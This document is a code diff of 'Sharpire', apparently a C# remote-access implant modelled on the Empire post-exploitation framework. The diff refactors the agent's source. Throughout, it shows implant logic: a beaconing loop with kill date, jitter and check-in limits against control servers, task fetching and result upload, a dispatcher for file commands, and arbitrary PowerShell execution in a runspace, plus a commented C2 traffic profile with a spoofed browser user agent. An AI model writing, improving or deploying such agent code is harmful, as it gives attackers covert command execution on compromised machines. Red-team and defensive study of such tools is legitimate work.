@@ -8,8 +8,6 @@ using System.Management.Automation;
 using System.Management.Automation.Runspaces;
 using System.Net;
 using System.Runtime.InteropServices;
-using System.Security;
-using System.Security.Cryptography;
 using System.Security.Principal;
 using System.Text;
 using System.Text.RegularExpressions;
@@ -25,7 +23,7 @@ namespace Sharpire
         private String sessionId;
         private String[] controlServers;
         private DateTime killDate;
-        private byte[] packets;
+        private Byte[] packets;
         private String[] workingHours = new String[2];
         //private String profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";
         
@@ -50,23 +48,30 @@ namespace Sharpire
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        public void execute()
+        public void Execute()
         {
             while (true)
             {
-                run();
+                Run();
             }
+        }
+
+        ////////////////////////////////////////////////////////////////////////////////
+        ////////////////////////////////////////////////////////////////////////////////
+        internal Coms GetComs()
+        {
+            return coms;
         }
 
         ////////////////////////////////////////////////////////////////////////////////
         // Main Loop
         ////////////////////////////////////////////////////////////////////////////////
-        private void run()
+        private void Run()
         {
             ////////////////////////////////////////////////////////////////////////////////
             if (killDate.CompareTo(DateTime.Now) > 0 || coms.missedCheckins > coms.lostLimit)
             {
-                jobTracking.checkAgentJobs(ref packets, ref coms);
+                jobTracking.CheckAgentJobs(ref packets, ref coms);
 
                 if (packets.Length > 0)
                 {
@@ -121,27 +126,22 @@ namespace Sharpire
                 Int32 sleepMax = (coms.agentJitter + 1) * coms.agentDelay;
 
                 if (sleepMin == sleepMax)
-                {
                     coms.sleepTime = sleepMin;
-                }
                 else
-                {
-                    Random random = new Random();
-                    coms.sleepTime = random.Next(sleepMin, sleepMax);
-                }
+                    coms.sleepTime = new Random().Next(sleepMin, sleepMax);
 
                 Thread.Sleep(coms.sleepTime * 1000);
             }
 
             ////////////////////////////////////////////////////////////////////////////////
-            byte[] jobResults = jobTracking.getAgentJobsOutput(ref coms);
-            if (jobResults.Length > 0)
+            Byte[] jobResults = jobTracking.GetAgentJobsOutput(ref coms);
+            if (0 < jobResults.Length)
             {
                 coms.sendMessage(jobResults);
             }
 
             ////////////////////////////////////////////////////////////////////////////////
-            byte[] taskData = coms.getTask();
+            Byte[] taskData = coms.getTask();
             if (taskData.Length > 0)
             {
                 coms.missedCheckins = 0;
@@ -211,7 +211,7 @@ namespace Sharpire
         ////////////////////////////////////////////////////////////////////////////////
         // Almost Done - Finish move copy delete
         ////////////////////////////////////////////////////////////////////////////////
-        internal static String invokeShellCommand(String command, String arguments)
+        internal static String InvokeShellCommand(String command, String arguments)
         {
             if (arguments.Contains("*\"\\\\*")) 
             {
@@ -226,7 +226,7 @@ namespace Sharpire
             {
                 if (command.Length > 0)
                 {
-                    output = runPowerShell(arguments);
+                    output = RunPowerShell(arguments);
                 }
                 else
                 {
@@ -236,28 +236,32 @@ namespace Sharpire
             }
             else
             {
-                //Change this to if, else if, else
-
                 if (command == "ls" || command == "dir" || command == "gci")
                 {
                     output = getChildItem(arguments);
                 }
                 else if (command == "mv" || command == "move")
                 {
-                    moveFile(arguments.Split(' ')[0], arguments.Split(' ')[1]);
-                    output = "executed " + command + " " + arguments;
+                    Console.WriteLine(arguments);
+                    String[] parts = arguments.Split(' ');
+                    if (2 != parts.Length)
+                        return "Invalid mv|move command";
+                    MoveFile(parts.FirstOrDefault(), parts.LastOrDefault());
+                    output = "[+] Executed " + command + " " + arguments;
                 }
                 else if (command == "cp" || command == "copy")
                 {
-                    copyFile(arguments.Split(' ')[0], arguments.Split(' ')[1]);
-                    output = "executed " + command + " " + arguments;
+                    String[] parts = arguments.Split(' ');
+                    if (2 != parts.Length)
+                        return "Invalid cp|copy command";
+                    CopyFile(parts.FirstOrDefault(), parts.LastOrDefault());
+                    output = "[+] Executed " + command + " " + arguments;
                 }
                 else if (command == "rm" || command == "del" || command == "rmdir")
                 {
-                    deleteFile(arguments);
-                    output = "executed " + command + " " + arguments;
+                    DeleteFile(arguments);
+                    output = "[+] Executed " + command + " " + arguments;
                 }
-
                 else if (command == "cd")
                 {
                     Directory.SetCurrentDirectory(arguments);
@@ -292,7 +296,7 @@ namespace Sharpire
                 }
                 else
                 {
-                    runPowerShell(arguments);
+                    RunPowerShell(arguments);
                     output = "executed " + command + " " + arguments + "\n\r";
                 }
             }
@@ -506,22 +510,20 @@ namespace Sharpire
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        private static void deleteFile(String sourceFile)
+        ////////////////////////////////////////////////////////////////////////////////
+        private static void DeleteFile(String sourceFile)
         {
-            if (isFile(sourceFile))
-            {
+            if (IsFile(sourceFile))
                 File.Delete(sourceFile);
-            }
             else
-            {
                 Directory.Delete(sourceFile, true);
-            }
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        private static void copyFile(String sourceFile, String destinationFile)
+        ////////////////////////////////////////////////////////////////////////////////
+        private static void CopyFile(String sourceFile, String destinationFile)
         {
-            if (isFile(sourceFile))
+            if (IsFile(sourceFile))
             {
                 File.Copy(sourceFile, destinationFile);
             }
@@ -541,30 +543,21 @@ namespace Sharpire
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        private static void moveFile(String sourceFile, String destinationFile)
+        ////////////////////////////////////////////////////////////////////////////////
+        private static void MoveFile(String sourceFile, String destinationFile)
         {
-            if (isFile(sourceFile))
-            {
+            if (IsFile(sourceFile))
                 File.Move(sourceFile, destinationFile);
-            }
             else
-            {
                 Directory.Move(sourceFile, destinationFile);
-            }
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        private static Boolean isFile(String filePath)
+        ////////////////////////////////////////////////////////////////////////////////
+        private static Boolean IsFile(String filePath)
         {
             FileAttributes fileAttributes = File.GetAttributes(filePath);
-            if ((fileAttributes & FileAttributes.Directory) == FileAttributes.Directory)
-            {
-                return false;
-            }
-            else
-            {
-                return true;
-            }
+            return (fileAttributes & FileAttributes.Directory) == FileAttributes.Directory ? false : true;
         }
 
         ////////////////////////////////////////////////////////////////////////////////
@@ -617,25 +610,42 @@ namespace Sharpire
         ////////////////////////////////////////////////////////////////////////////////
         // Working
         ////////////////////////////////////////////////////////////////////////////////
-        internal static String runPowerShell(string command)
+        internal static String RunPowerShell(String command)
         {
-            StringBuilder stringBuilder = new StringBuilder();
-            Runspace runspace = RunspaceFactory.CreateRunspace();
-            runspace.Open();
-            RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
-            
-            Pipeline pipeline = runspace.CreatePipeline();
-            pipeline.Commands.AddScript(command);
-            pipeline.Commands.Add("Out-String");
-            Collection<PSObject> results = pipeline.Invoke();
-
-            runspace.Close();
-            
-            foreach (PSObject obj in results)
+            using (Runspace runspace = RunspaceFactory.CreateRunspace())
             {
-                stringBuilder.Append(obj.ToString());
+                runspace.Open();
+
+                using (Pipeline pipeline = runspace.CreatePipeline())
+                {
+                    pipeline.Commands.AddScript(command);
+                    pipeline.Commands.Add("Out-String");
+
+                    StringBuilder sb = new StringBuilder();
+                    try
+                    {
+                        Collection<PSObject> results = pipeline.Invoke();
+                        foreach (PSObject obj in results)
+                        {
+                            sb.Append(obj.ToString());
+                        }
+                    }
+                    catch (ParameterBindingException error)
+                    {
+                        sb.Append("[-] ParameterBindingException: " + error.Message);
+                    }                    
+                    catch (CmdletInvocationException error)
+                    {
+                        sb.Append("[-] CmdletInvocationException: " + error.Message);
+                    }
+                    catch (RuntimeException error)
+                    {
+                        sb.Append("[-] RuntimeException: " + error.Message);
+                    }
+
+                    return sb.ToString();
+                }
             }
-            return stringBuilder.ToString();
         }
     }
 }
